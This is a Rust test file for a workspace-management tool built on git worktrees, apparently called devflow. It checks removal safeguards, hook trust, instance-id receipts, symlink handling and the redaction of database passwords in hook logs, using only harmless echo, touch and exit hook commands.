        let error = remove(
            "guarded",
            RemoveOptions {
                force,
                cwd: Some(sub.clone()),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(error.to_string().contains("current directory"), "{error:#}");
        assert!(
            !protection(&error).forceable,
            "--force cannot override this"
        );
        still_there();
    }

    // Dirty needs --force.
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("uncommitted"), "{error:#}");
    assert!(protection(&error).forceable);
    assert!(error.to_string().ends_with("or pass --force"), "{error:#}");
    still_there();
    std::fs::remove_file(w.path.join("wip.txt")).unwrap();
    std::fs::remove_dir_all(w.path.join("src")).unwrap();

    // Locked needs --force.
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .lock(Some("busy"))
        .unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("locked"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .unlock()
        .unwrap();

    // Untrusted teardown hooks refuse (they would otherwise run unreviewed code).
    let mut changed = t.project.clone();
    changed.config.hooks.teardown.push("echo more".into());
    let error = setup::remove(
        &changed,
        "guarded",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("not trusted"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();

    // Unmerged branches are protected up front when deleting the branch.
    let repo = git2::Repository::open(&w.path).unwrap();
    std::fs::write(w.path.join("feature.txt"), "x").unwrap();
    commit_all(&repo, "feature work");
    let error = remove(
        "guarded",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("not in the default workspace"),
        "{error:#}"
    );
    assert!(protection(&error).forceable);
    still_there();

    // With everything satisfied it goes: teardown first, then the worktree; branch kept by default.
    let out = remove("guarded", RemoveOptions::default()).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(out.hooks.unwrap().ok);
    assert!(!w.path.exists());
    assert!(!w.git_dir.exists());
    assert!(!out.deleted_branch && out.dropped_branch.is_none());
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("guarded", git2::BranchType::Local)
            .is_ok()
    );
}

#[test]
fn teardown_failure_blocks_removal_unless_forced() {
    let t = repo(
        &Hooks {
            teardown: &["echo cleaning; exit 5"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "stuck", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut rec = Recorder::default();
    let error = setup::remove(&t.project, "stuck", RemoveOptions::default(), &mut rec).unwrap_err();
    assert!(
        error.to_string().contains("exit 5") && error.to_string().contains("--force"),
        "{error:#}"
    );
    assert!(protection(&error).forceable, "--force removes it anyway");
    assert!(w.path.exists(), "removal was blocked");
    assert!(rec.lines.iter().any(|l| l == "cleaning"));

    let out = setup::remove(
        &t.project,
        "stuck",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(!out.hooks.unwrap().ok);
    assert!(
        out.warnings.iter().any(|w| w.contains("exit 5")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn forced_removal_handles_dirty_locked_untrusted_and_deletes_branches() {
    let t = repo(
        &Hooks {
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "doomed", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    t.project
        .repo()
        .unwrap()
        .find_worktree("doomed")
        .unwrap()
        .lock(None)
        .unwrap();
    let out = setup::remove(
        &t.project,
        "doomed",
        RemoveOptions {
            force: true,
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(
        out.hooks.is_none(),
        "untrusted teardown hooks are skipped under --force"
    );
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(out.deleted_branch);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("doomed", git2::BranchType::Local)
            .is_err()
    );
    assert!(!w.path.parent().unwrap().join("teardown-ran").exists());
}

#[test]
fn removing_a_merged_branch_and_a_vanished_directory() {
    let t = plain();
    let a = create(&t.project, "merged", SetupOptions::default())
        .unwrap()
        .workspace;
    let out = setup::remove(
        &t.project,
        "merged",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.deleted_branch,
        "no commits of its own, so it counts as merged"
    );
    assert!(!a.path.exists());

    let b = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&b.path).unwrap();
    assert!(
        setup::list(&t.project)
            .unwrap()
            .iter()
            .any(|s| s.workspace.missing)
    );
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(worktree::list(&t.project).unwrap().len(), 1);
    assert!(
        setup::remove(
            &t.project,
            "vanished",
            RemoveOptions::default(),
            &mut NoProgress
        )
        .is_err()
    );
}

#[test]
fn switch_runs_switch_hooks_each_time_but_only_when_trusted_and_ready() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "hop", SetupOptions::default())
        .unwrap()
        .workspace;
    let log = w.path.join(".devflow/switch.log");

    // Untrusted: a warning, not a failure.
    let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.hooks.is_none());
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(!log.exists());

    trust::approve(&t.project).unwrap();
    for _ in 0..2 {
        let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
        assert!(out.warnings.is_empty(), "{:?}", out.warnings);
        assert!(out.hooks.unwrap().ok);
    }
    assert_eq!(
        std::fs::read_to_string(&log).unwrap(),
        "switched\nswitched\n"
    );
    let out = setup::switch(
        &t.project,
        &w,
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.hooks.is_none());
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);

    // A failing switch hook is a warning with the report attached.
    let mut failing = t.project.clone();
    failing.config.hooks.switch = vec!["exit 9".into()];
    trust::approve(&failing).unwrap();
    let out = setup::switch(&failing, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("exit 9") || w.contains("code 9")),
        "{:?}",
        out.warnings
    );
    assert!(!out.hooks.unwrap().ok);
    assert_eq!(
        out.status,
        Status::Ready,
        "switch hooks never poison the receipt"
    );
}

#[test]
fn switch_resumes_an_incomplete_setup_first() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "later", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(!w.path.join(".devflow/setup-ran").exists());
    trust::approve(&t.project).unwrap();
    let out = setup::switch(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/setup-ran").exists());
    assert!(w.path.join(".devflow/switch-ran").exists());
}

#[test]
fn project_without_postgres_has_no_database_operations() {
    let t = plain();
    let w = create(&t.project, "nodatabase", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(setup::reset_data(&t.project, &w, None).is_err());
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    assert!(setup::snapshot(&t.project, &w, "bad name").is_err());
}

#[test]
fn env_vars_include_database_entries_only_when_bound() {
    let t = plain();
    let w = create(&t.project, "vars", SetupOptions::default()).unwrap();
    let vars = setup::env_vars(&t.project, &w.workspace, &w.receipt);
    let keys: Vec<_> = vars.iter().map(|(k, _)| k.as_str()).collect();
    assert_eq!(
        keys,
        [
            "DEVFLOW_PROJECT",
            "DEVFLOW_PROJECT_ROOT",
            "DEVFLOW_WORKSPACE",
            "DEVFLOW_WORKSPACE_PATH",
            "DEVFLOW_SOURCE_PATH",
            "DEVFLOW_WORKSPACE_ID"
        ]
    );
    // The default workspace has no source path.
    let default = worktree::list(&t.project).unwrap().remove(0);
    let receipt = Receipt::new(t.project.id(), &default.name, None);
    let keys: Vec<_> = setup::env_vars(&t.project, &default, &receipt)
        .into_iter()
        .map(|(k, _)| k)
        .collect();
    assert!(!keys.contains(&"DEVFLOW_SOURCE_PATH".to_string()));
}

#[test]
fn doctor_reports_a_workspace_that_needs_attention() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    create(&t.project, "pending", SetupOptions::default()).unwrap();
    let checks = devflow_core::doctor::run(Some(&t.project));
    let workspaces: Vec<_> = checks.iter().filter(|c| c.name == "workspaces").collect();
    assert!(
        workspaces.iter().any(|c| c.detail.contains("pending")),
        "{workspaces:?}"
    );
    let trust = checks.iter().find(|c| c.name == "hook-trust").unwrap();
    assert_eq!(trust.status, devflow_core::doctor::CheckStatus::Warn);
}

#[test]
fn removing_a_vanished_workspace_never_deletes_what_replaced_it() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&w.path).unwrap();
    // An ordinary directory is created at the same path.
    std::fs::create_dir_all(w.path.join("src")).unwrap();
    std::fs::write(w.path.join("src/precious.txt"), "keep").unwrap();
    assert!(ws(&t.project, "vanished").missing);

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "vanished",
            RemoveOptions {
                force,
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        let refusal = protection(&error);
        assert!(!refusal.forceable, "{refusal}");
        assert_eq!(refusal.workspace, "vanished");
        assert!(error.to_string().contains("not the checkout"), "{error:#}");
        assert_eq!(
            std::fs::read_to_string(w.path.join("src/precious.txt")).unwrap(),
            "keep",
            "force={force}"
        );
        assert!(!marker.exists());
        assert!(
            worktree::find(&t.project, "vanished").unwrap().is_some(),
            "the registration is left for the user to resolve"
        );
    }

    // Once the path is really free only the registration goes.
    std::fs::remove_dir_all(&w.path).unwrap();
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(worktree::find(&t.project, "vanished").unwrap().is_none());
    assert!(!w.git_dir.exists());
    assert!(!w.path.exists(), "nothing was created in its place either");
}

fn expecting(w: &Workspace, instance_id: Option<uuid::Uuid>) -> setup::ExpectedWorkspace {
    setup::ExpectedWorkspace {
        path: w.path.clone(),
        instance_id,
        fingerprint: w.fingerprint.clone(),
    }
}

#[test]
fn removal_is_refused_when_the_workspace_is_not_the_one_that_was_shown() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let remove = |project: &Project, expect: Option<setup::ExpectedWorkspace>, force: bool| {
        setup::remove(
            project,
            "doc",
            RemoveOptions {
                force,
                expect,
                ..Default::default()
            },
            &mut NoProgress,
        )
    };
    let refused = |error: &anyhow::Error| {
        let refusal = protection(error);
        assert!(
            !refusal.forceable,
            "--force must not override this: {refusal}"
        );
        assert!(
            error.to_string().contains("changed since it was shown"),
            "{error:#}"
        );
    };

    // The view the user had: `doc` at one path with one receipt.
    let shown = create(&t.project, "doc", SetupOptions::default()).unwrap();
    let view = expecting(&shown.workspace, Some(shown.receipt.instance_id));

    // Recreated at the same path with a new receipt (a new instance).
    remove(&t.project, None, false).unwrap();
    assert!(marker.exists());
    std::fs::remove_file(&marker).unwrap();
    let again = create(&t.project, "doc", SetupOptions::default()).unwrap();
    assert_eq!(again.workspace.path, shown.workspace.path);
    assert_ne!(again.receipt.instance_id, shown.receipt.instance_id);
    for force in [false, true] {
        let error = remove(&t.project, Some(view.clone()), force).unwrap_err();
        refused(&error);
        assert!(error.to_string().contains("receipt"), "{error:#}");
        assert!(again.workspace.path.exists());
        assert!(!marker.exists(), "no teardown before the check");
    }

    // Recreated at another path.
    remove(&t.project, None, false).unwrap();
    std::fs::remove_file(&marker).unwrap();
    let mut moved = t.project.clone();
    moved.config.worktree.dir = t
        .root
        .parent()
        .unwrap()
        .join("elsewhere")
        .to_string_lossy()
        .into_owned();
    let elsewhere = create(&moved, "doc", SetupOptions::default()).unwrap();
    assert_ne!(elsewhere.workspace.path, shown.workspace.path);
    let same_receipt = expecting(&shown.workspace, Some(elsewhere.receipt.instance_id));
    for force in [false, true] {
        let error = remove(&moved, Some(same_receipt.clone()), force).unwrap_err();
        refused(&error);
        assert!(
            error
                .to_string()
                .contains(&elsewhere.workspace.path.display().to_string()),
            "{error:#}"
        );
        assert!(elsewhere.workspace.path.exists());
        assert!(!marker.exists());
    }

    // `None` means "had no receipt", and means it both ways.
    let bare = worktree::create(&moved, "bare", None).unwrap();
    let bare_remove = |expect: setup::ExpectedWorkspace| {
        setup::remove(
            &moved,
            "bare",
            RemoveOptions {
                expect: Some(expect),
                ..Default::default()
            },
            &mut NoProgress,
        )
    };
    refused(&bare_remove(expecting(&bare, Some(uuid::Uuid::new_v4()))).unwrap_err());
    assert!(bare.path.exists());
    let error = remove(&moved, Some(expecting(&elsewhere.workspace, None)), false).unwrap_err();
    refused(&error);
    assert!(elsewhere.workspace.path.exists());
    assert!(!marker.exists());

    // The right view removes: teardown runs, then the worktree goes.
    bare_remove(expecting(&bare, None)).unwrap();
    assert!(!bare.path.exists());
    let current = expecting(&elsewhere.workspace, Some(elsewhere.receipt.instance_id));
    // A path spelled through a symlink or with `..` is the same path.
    let mut spelled = current.clone();
    spelled.path = elsewhere
        .workspace
        .path
        .join("..")
        .join(elsewhere.workspace.path.file_name().unwrap());
    remove(&moved, Some(spelled), false).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(!elsewhere.workspace.path.exists());
}

#[test]
fn a_receipt_replaced_after_the_first_check_is_still_caught() {
    // The listing and the removal can be far apart; the receipt read under the
    // lock is what counts.
    let t = plain();
    let w = create(&t.project, "swap", SetupOptions::default()).unwrap();
    let shown = expecting(&w.workspace, Some(w.receipt.instance_id));
    // Fork it: same path, new identity.
    let out = setup::setup(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_ne!(out.receipt.instance_id, w.receipt.instance_id);
    let error = setup::remove(
        &t.project,
        "swap",
        RemoveOptions {
            expect: Some(shown),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("changed since it was shown"),
        "{error:#}"
    );
    assert!(w.workspace.path.exists());
    assert_eq!(receipt_of(&w.workspace), out.receipt);
}

#[test]
fn removing_a_workspace_that_contains_another_is_refused_even_forced() {
    let t = plain();
    let outer = create(&t.project, "outer", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut nested = t.project.clone();
    nested.config.worktree.dir = outer.path.join("nested").to_string_lossy().into_owned();
    worktree::create(&nested, "inner", None).unwrap();
    let error = setup::remove(
        &t.project,
        "outer",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("lives inside"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert!(outer.path.exists());
}

#[test]
fn concurrent_creation_of_names_sharing_a_directory_leaves_one_intact_workspace() {
    let t = plain();
    let barrier = std::sync::Barrier::new(2);
    let results: Vec<_> = std::thread::scope(|scope| {
        let handles: Vec<_> = ["feature/a", "feature-a"]
            .into_iter()
            .map(|name| {
                let (project, barrier) = (&t.project, &barrier);
                scope.spawn(move || {
                    barrier.wait();
                    create(project, name, SetupOptions::default())
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).collect()
    });
    let winners: Vec<_> = results.iter().filter_map(|r| r.as_ref().ok()).collect();
    assert_eq!(winners.len(), 1, "{results:?}");
    let error = results.iter().find_map(|r| r.as_ref().err()).unwrap();
    assert!(error.to_string().contains("already exists"), "{error:#}");

    let winner = winners[0];
    assert_eq!(winner.status, Status::Ready);
    assert!(winner.workspace.path.join("README.md").is_file());
    assert_eq!(receipt_of(&winner.workspace), winner.receipt);
    let all = worktree::list(&t.project).unwrap();
    assert_eq!(all.len(), 2);
    assert!(!all[1].missing);
}

#[test]
fn a_symlinked_devflow_directory_is_never_written_through() {
    let t = plain();
    let w = worktree::create(&t.project, "linked", None).unwrap();
    let outside = tempfile::tempdir().unwrap();
    let sentinel = outside.path().join("env");
    std::fs::write(&sentinel, "belongs to someone else").unwrap();
    std::os::unix::fs::symlink(outside.path(), w.path.join(".devflow")).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("symlink"), "{error:#}");
    assert_eq!(
        std::fs::read_to_string(&sentinel).unwrap(),
        "belongs to someone else"
    );
    assert!(!outside.path().join(".gitignore").exists());
    let receipt = receipt_of(&w);
    assert_eq!(receipt.phase(Phase::Env).state, PhaseState::Failed);
    assert_eq!(receipt.status(), Status::NeedsAttention);

    // Fixing it lets the same setup resume and finish.
    std::fs::remove_file(w.path.join(".devflow")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(env_file::path(&w.path).is_file());
}

#[test]
fn hook_output_and_logs_never_contain_the_database_password() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"pw=$PGPASSWORD url=$DATABASE_URL\"",
                "echo \"again $PGPASSWORD\" >&2",
                "echo PGPASSWORD=Sup3rSecretPw psql",
            ],
            ..Default::default()
        },
        "",
    );
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "creds".into(),
            from: None,
            options: SetupOptions {
                database_url: Some("postgres://app:Sup3rSecretPw@localhost:5439/app".into()),
                trust_hooks: true,
                ..Default::default()
            },
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok, "{report:?}");
    let log = std::fs::read_to_string(report.log.as_ref().unwrap()).unwrap();
    assert!(log.contains("pw=***"), "{log}");
    assert!(!log.contains("Sup3rSecretPw"), "{log}");
    assert!(
        rec.lines.iter().all(|l| !l.contains("Sup3rSecretPw")),
        "{:?}",
        rec.lines
    );
    assert!(
        rec.lines
            .iter()
            .any(|l| l.contains("url=postgres://app:***@localhost:5439/app")),
        "{:?}",
        rec.lines
    );
    // The generated env file is the one place that must keep it.
    assert_eq!(env_map(&out.workspace)["PGPASSWORD"], "Sup3rSecretPw");
}

#[test]
fn run_switch_hooks_runs_what_create_leaves_to_the_caller() {
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let ran = |w: &Workspace| w.path.join(".devflow/switch-ran").exists();
    // Untrusted: nothing runs, whatever the caller asks.
    let out = create(&t.project, "first", SetupOptions::default()).unwrap();
    assert!(out.hooks.is_none() && !ran(&out.workspace));
    assert!(
        setup::run_switch_hooks(
            &t.project,
            &out.workspace,
            &SetupOptions::default(),
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    assert!(!ran(&out.workspace));

    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "second", SetupOptions::default()).unwrap();
    assert!(out.hooks.is_none(), "create does not run switch hooks");
    assert!(!ran(&out.workspace));
    let mut rec = Recorder::default();
    let report = setup::run_switch_hooks(&t.project, &out.workspace, &trusted(), &mut rec)
        .unwrap()
        .expect("trusted and ready");
    assert!(report.ok && report.runs.len() == 1);
    assert!(ran(&out.workspace));
    assert!(rec.lines.iter().any(|l| l.starts_with("$ touch")));

    // --no-hooks, and a workspace devflow has not set up.
    let skip = SetupOptions {
        no_hooks: true,
        ..Default::default()
    };
    assert!(
        setup::run_switch_hooks(&t.project, &out.workspace, &skip, &mut NoProgress)
            .unwrap()
            .is_none()
    );
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    assert!(
        setup::run_switch_hooks(&t.project, &raw, &trusted(), &mut NoProgress)
            .unwrap()
            .is_none()
    );
}

#[test]
fn devflow_instance_id_forks_a_copied_receipt() {
    const NAME: &str = "devflow_instance_id_forks_a_copied_receipt";
    let named = "6f1d3a1e-7a53-4c83-9a2f-0f1a2b3c4d5e";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", named)]) {
        return;
    }
    let named: uuid::Uuid = named.parse().unwrap();
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let started = |rec: &Recorder| -> Vec<Phase> {
        rec.phases
            .iter()
            .filter(|(_, s)| *s == PhaseState::Started)
            .map(|(p, _)| *p)
            .collect()
    };
    let rerun = |w: &Workspace, if_new: bool, rec: &mut Recorder| {
        setup::setup(&t.project, w, SetupOptions::default(), if_new, false, rec).unwrap()
    };

    // Creating does not honour the override: the receipt is born with its own id.
    let first = create(&t.project, "vm", SetupOptions::default()).unwrap();
    assert_ne!(first.receipt.instance_id, named);
    assert_ne!(Receipt::new(t.project.id(), "x", None).instance_id, named);
    let w = first.workspace;

    // The explicit `setup` obeys it: a receipt of another instance is a copy
    // (even with `--if-new` on a ready receipt), and the id becomes the identity.
    let (old, branch) = (first.receipt.instance_id, uuid::Uuid::new_v4());
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.data = Some(DataBinding {
        branch_id: Some(branch),
        database: "df_a_b".into(),
        role: "dfl_b".into(),
        url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(),
        source: "workspace:main".into(),
        owned: true,
    });
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let mut rec = Recorder::default();
    let out = rerun(&w, true, &mut rec).expect("forked instead of skipped");
    assert_eq!(out.receipt.instance_id, named);
    assert_ne!(out.receipt.instance_id, old);
    assert!(
        out.receipt.data.is_none(),
        "the owned binding lost its authority"
    );
    assert_eq!(out.receipt.data_source, Some(format!("branch:{branch}")));
    assert_eq!(
        started(&rec),
        vec![Phase::Database, Phase::Env, Phase::Hooks]
    );
    assert_eq!(env_map(&w)["DEVFLOW_WORKSPACE_ID"], named.to_string());
    assert!(!env_map(&w).contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        named.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // The same override again changes nothing.
    let mut rec = Recorder::default();
    assert!(rerun(&w, true, &mut rec).is_none());
    let out = rerun(&w, false, &mut rec).unwrap();
    assert!(started(&rec).is_empty());
    assert_eq!(out.receipt.instance_id, named);

    // A receipt without an identity of its own (an adopted worktree) takes it.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    // `named` already belongs to `vm`: refused, and nothing is written.
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("recorded for workspace 'vm'"),
        "{error:#}"
    );
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn sourcing_one_workspaces_env_does_not_fork_another_workspace() {
    // The reviewer's scenario: `source A/.devflow/env`, then work on B. With the
    // old export that put A's id in DEVFLOW_INSTANCE_ID and every command about
    // B treated it as a fork request.
    const NAME: &str = "sourcing_one_workspaces_env_does_not_fork_another_workspace";
    let a_id = "0a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", a_id)]) {
        return;
    }
    let a_id: uuid::Uuid = a_id.parse().unwrap();
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switched"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // A carries the id the shell has; B is attached to a database by URL.
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let mut receipt = receipt_of(&a.workspace);
    receipt.instance_id = a_id;
    receipt.save(&a.workspace.git_dir).unwrap();
    let url = "postgres://b:pw@db.internal:5432/b_data";
    let b = create(
        &t.project,
        "b",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let b_receipt = b.receipt.clone();
    assert_ne!(b_receipt.instance_id, a_id);
    assert_eq!(b_receipt.data.as_ref().unwrap().url, url);

    // What A's env file offers a sourcing shell is informational only.
    let a_env = env_map(&a.workspace);
    assert!(!a_env.contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        env_file::read(&a.workspace.path).unwrap().len(),
        a_env.len()
    );

    let unchanged = |what: &str| {
        assert_eq!(receipt_of(&b.workspace), b_receipt, "{what}");
        assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url, "{what}");
    };
    let mut rec = Recorder::default();
    let out = setup::switch(&t.project, &b.workspace, SetupOptions::default(), &mut rec).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.hooks.is_some(), "the switch hook ran");
    assert!(
        rec.phases.iter().all(|(_, s)| *s != PhaseState::Started),
        "no phase re-ran: {:?}",
        rec.phases
    );
    unchanged("switch");

    // Creating over an unfinished B resumes it instead of forking it.
    let mut unfinished = receipt_of(&b.workspace);
    unfinished.set_phase(Phase::Hooks, PhaseState::Pending, None);
    unfinished.save(&b.workspace.git_dir).unwrap();
    let resumed = create(&t.project, "b", SetupOptions::default()).unwrap();
    assert_eq!(resumed.receipt.instance_id, b_receipt.instance_id);
    assert_eq!(resumed.receipt.data, b_receipt.data);

    setup::run_switch_hooks(&t.project, &b.workspace, &trusted(), &mut NoProgress).unwrap();
    assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
    assert_eq!(
        setup::list(&t.project).unwrap()[2]
            .receipt
            .as_ref()
            .unwrap()
            .instance_id,
        b_receipt.instance_id
    );
    assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url);

    // Explicit `setup` in B with A's id is refused, and B stays as it was.
    for if_new in [false, true] {
        let error = setup::setup(
            &t.project,
            &b.workspace,
            SetupOptions::default(),
            if_new,
            false,
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(
            format!("{error:#}").contains("recorded for workspace 'a'"),
            "{error:#}"
        );
        assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
        assert_eq!(receipt_of(&b.workspace).data, b_receipt.data);
    }
    // ...while in A itself the same id is simply A's own: nothing to do.
    let out = setup::setup(
        &t.project,
        &a.workspace,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.is_none());
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);

    // Removing B is not steered by the variable either.
    let removed =
        setup::remove(&t.project, "b", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(removed.workspace.name, "b");
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);
}

#[test]
fn devflow_trust_hooks_trusts_setup_switch_and_teardown_alike() {
    const NAME: &str = "devflow_trust_hooks_trusts_setup_switch_and_teardown_alike";
    if !in_child(NAME, &[("DEVFLOW_TRUST_HOOKS", "1")]) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            teardown: &["touch ../teardown-ran"],
        },
        "",
    );
    assert!(
        matches!(
            trust::state(&t.project).unwrap(),
            trust::TrustState::Untrusted { .. }
        ),
        "nothing was approved"
    );
    let out = create(&t.project, "ci", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(out.workspace.path.join(".devflow/setup-ran").exists());

    let out = setup::switch(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
    assert!(out.hooks.unwrap().ok);
    assert!(out.workspace.path.join(".devflow/switch-ran").exists());

    let removed =
        setup::remove(&t.project, "ci", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert!(removed.hooks.unwrap().ok, "teardown ran without --force");
    assert!(removed.warnings.is_empty(), "{:?}", removed.warnings);
    assert!(
        removed
            .workspace
            .path
            .parent()
            .unwrap()
            .join("teardown-ran")
            .exists()
    );
}

#[test]
fn generated_pg_variables_agree_with_database_url_and_unusable_urls_fail_up_front() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGHOSTADDR|$PGPORT|$PGSSLMODE|$PGDATABASE|${PGSCHEMA-unset}\" > .devflow/seen",
            ],
            ..Default::default()
        },
        "",
    );
    let attach = |name: &str, url: &str| {
        create(
            &t.project,
            name,
            SetupOptions {
                database_url: Some(url.into()),
                trust_hooks: true,
                ..Default::default()
            },
        )
    };

